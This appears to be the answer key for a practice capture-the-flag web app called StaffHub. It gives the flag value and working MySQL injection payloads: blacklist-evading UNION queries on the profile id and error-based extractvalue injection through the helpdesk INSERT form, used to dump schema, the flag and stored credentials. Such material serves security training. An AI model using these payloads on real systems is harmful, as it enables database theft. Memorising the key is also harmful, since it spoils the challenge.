# StaffHub (`/staff`)

- **Difficulty:** Medium
- **Engine:** MySQL 8.0 (database `staffhub`, runtime user has only SELECT/INSERT/UPDATE/DELETE)
- **Flag:** `FLAG{staffhub_granite_signal_ledger}` in table `it_secrets`, column `secret` (row `Backup vault`)
- **Injection points:** (1) `/staff/profile?id=` numeric context behind a weak blacklist, (2) `/staff/helpdesk` POST (INSERT) fields `name`, `subject`, `message`
- **Site:** fully public intranet (no login, no sign-up). Everything is reachable by browsing; there is nothing hidden.

## Discovery

- Directory (`/staff/directory`) and the home page link each person to `/staff/profile?id=N`.
- `id=1'` returns `Could not load profile: You have an error in your SQL syntax...` (visible MySQL error). `id=1 and 1=2` returns no profile, `id=1 and 1=1` returns it, so it is numeric context with no quotes needed.
- `id=1 union select 1` returns `Invalid employee reference.` -> a blacklist exists. Blocked (case-sensitive substring match): `union`, `select`, `from`, `information_schema`, `sleep`, `benchmark`, `load_file`, `outfile`, `--`, `#`.
- Bypass: change the case (`UnIoN SeLeCt`, `FrOm`, `INFORMATION_SCHEMA`). Comments are not needed in numeric context (the query ends after `id = <input>`).
- Helpdesk form (`/staff/helpdesk`): a quote in name/subject/message gives `We could not log your request: <MySQL error>`.

## 1. Profile `id` (UNION or error-based)

Query: `SELECT id, full_name, job_title, department, email, phone, office, bio FROM employees WHERE id = <id>` (8 columns; the first row is printed, all columns reflected, `full_name` is the page heading).

UNION (use a non-existent id so only the injected row shows):
- Version: `-1 UnIoN SeLeCt 1,version(),3,4,5,6,7,8`
- Tables: `-1 UnIoN SeLeCt 1,group_concat(table_name),3,4,5,6,7,8 FrOm INFORMATION_SCHEMA.tables WHERE table_schema=database()`
  Tables: accounts, announcements, departments, employees, it_secrets, leave_requests, old_hr_logins, payroll_archive, tickets
- Columns: `-1 UnIoN SeLeCt 1,group_concat(column_name),3,4,5,6,7,8 FrOm INFORMATION_SCHEMA.columns WHERE table_schema=database() AND table_name=0x69745f73656372657473` (hex of `it_secrets`; quotes also work: `table_name='it_secrets'`)
- Flag: `-1 UnIoN SeLeCt 1,group_concat(system_name,0x3a,secret),3,4,5,6,7,8 FrOm it_secrets`
- Credential-like rows: `-1 UnIoN SeLeCt 1,group_concat(username,0x3a,password),3,4,5,6,7,8 FrOm accounts` (passwords are MD5 hashes); `old_hr_logins` holds plaintext legacy logins.

Error-based (XPATH errors show up to 32 characters, so page through with `substr`):
- `1 and extractvalue(1,concat(0x7e,(SeLeCt version())))`
- `1 and extractvalue(1,concat(0x7e,substr((SeLeCt group_concat(table_name) FrOm INFORMATION_SCHEMA.tables WHERE table_schema=database()),1,31)))` then offsets 32, 63, ...
- Same pattern for columns and for `secret` of `it_secrets`.

## 2. Helpdesk INSERT (error-based)

Query: `INSERT INTO tickets (ref, requester, category, subject, message, status, created_at) VALUES ('<ref>', '<name>', '<category>', '<subject>', '<message>', 'open', NOW())`
`category` is validated against a whitelist; name, subject and message are concatenated.

Payload (put it in `subject`, `name` or `message`; the other fields can be normal text):
`' or extractvalue(1,concat(0x7e,(select version()))) or '`
- Tables: `' or extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))) or '` (then offset 32, 63, ...)
- Columns: same with `information_schema.columns ... table_name='it_secrets'`
- Flag: `' or extractvalue(1,concat(0x7e,substr((select group_concat(secret) from it_secrets),1,31))) or '`
- Notes: the lowercase blacklist does NOT apply here. Start the payload with an empty string `'` (as shown). A non-numeric prefix such as `z'` makes MySQL fail on the string-to-number conversion before the subquery runs. Each failed attempt is rejected, so nothing is stored. A successful normal submission shows a `REQ-xxxx` reference.

## Rabbit holes (all safe)

Visible, data-fetching, look injectable:
1. `/staff/directory?dept=` : bound parameter ("No employees found"). `?page=` is digit-validated and falls back with "Invalid page number" (looks like an error handler for a quote).
2. `/staff/search?q=` : rejects quotes with "Search terms may only contain letters, numbers and spaces" and uses bound LIKE parameters anyway.
3. `/staff/helpdesk/track?ref=` : bound parameter ("No request found").
4. `/staff/news?id=` : digits only (otherwise a generic "could not be found"), then bound.

Dead ends:
- `/staff/admin`, `/staff/admin/`, `/staff/backup` : static 403 pages. There is no login anywhere.
- `/staff/directory/print` (printable edition "not available"), `/staff/handbook` (moved), `/staff/about`, `/staff/contact` (static).
- Decoy tables: `payroll_archive` (fake IBANs/gross pay), `old_hr_logins` (disabled accounts), `leave_requests`; `employees.salary` is not displayed anywhere.
